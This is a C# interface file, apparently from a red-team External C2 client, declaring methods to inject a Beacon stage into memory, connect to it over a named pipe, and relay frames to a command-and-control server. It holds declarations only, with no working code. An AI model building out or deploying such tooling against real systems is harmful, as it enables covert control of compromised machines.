using System.Threading.Tasks;
using ExternalC2.Base;

namespace ExternalC2.Client
{
    public interface IBeaconController
    {
        /// <summary>
        /// Configure the Beacon Controller
        /// </summary>
        /// <param name="pipeName"></param>
        /// The Beacons pipe name
        void Configure(string pipeName);
        
        /// <summary>
        /// Inject the Beacon stage into memory
        /// </summary>
        /// <param name="stage"></param>
        /// <returns></returns>
        bool InjectStage(byte[] stage);

        /// <summary>
        /// Connect to the injected Beacon
        /// </summary>
        /// <returns></returns>
        Task<bool> Connect();
        
        /// <summary>
        /// Send a frame to the External C2 server.
        /// </summary>
        /// <param name="frame"></param>
        /// <returns></returns>
        Task WriteFrame(C2Frame frame);

        /// <summary>
        /// Read a frame from the External C2 server.
        /// </summary>
        /// <returns></returns>
        Task<C2Frame> ReadFrame();
    }
}